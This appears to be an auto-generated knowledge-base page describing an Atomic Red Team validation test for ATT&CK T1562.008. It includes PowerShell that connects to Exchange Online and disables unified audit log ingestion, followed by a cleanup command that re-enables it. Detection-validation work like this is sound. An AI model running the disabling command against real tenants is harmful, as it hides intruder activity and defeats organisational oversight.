---
atomic_guid: "1ee572f3-056c-4632-a7fc-7e7c42b1543c"
title: "Office 365 - Exchange Audit Log Disabled"
framework: "atomic"
generated: "true"
attack_technique_id: "T1562.008"
attack_technique_name: "Impair Defenses: Disable Cloud Logs"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.008/T1562.008.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "1ee572f3-056c-4632-a7fc-7e7c42b1543c"
  - "Office 365 - Exchange Audit Log Disabled"
platforms:
  - "office-365"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Office 365 - Exchange Audit Log Disabled

You can use the Exchange Management Shell to enable or disable mailbox audit logging for a mailbox.
Unified or Admin Audit logs are disabled via the Exchange Powershell cmdline.
https://github.com/Azure/Azure-Sentinel/blob/master/Detections/OfficeActivity/exchange_auditlogdisabled.yaml

## Metadata

- Atomic GUID: 1ee572f3-056c-4632-a7fc-7e7c42b1543c
- Technique: T1562.008: Impair Defenses: Disable Cloud Logs
- Platforms: office-365
- Executor: powershell
- Elevation Required: False
- Dependency Executor: powershell
- Source Path: atomics/T1562.008/T1562.008.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1562-impair_defenses|T1562.008]]

## Input Arguments

### password

- description: office-365 password
- type: string

### username

- description: office-365 username
- type: string

## Dependencies

ExchangeOnlineManagement PowerShell module must be installed

### Prerequisite Check

```powershell
$RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}
```

### Get Prerequisite

```powershell
Install-Module -Name ExchangeOnlineManagement         
Import-Module ExchangeOnlineManagement
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
$secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd
Connect-ExchangeOnline -Credential $creds
Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $False
```

### Cleanup

```powershell
$secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd
Connect-ExchangeOnline -Credential $creds
Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $True
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.008/T1562.008.yaml)
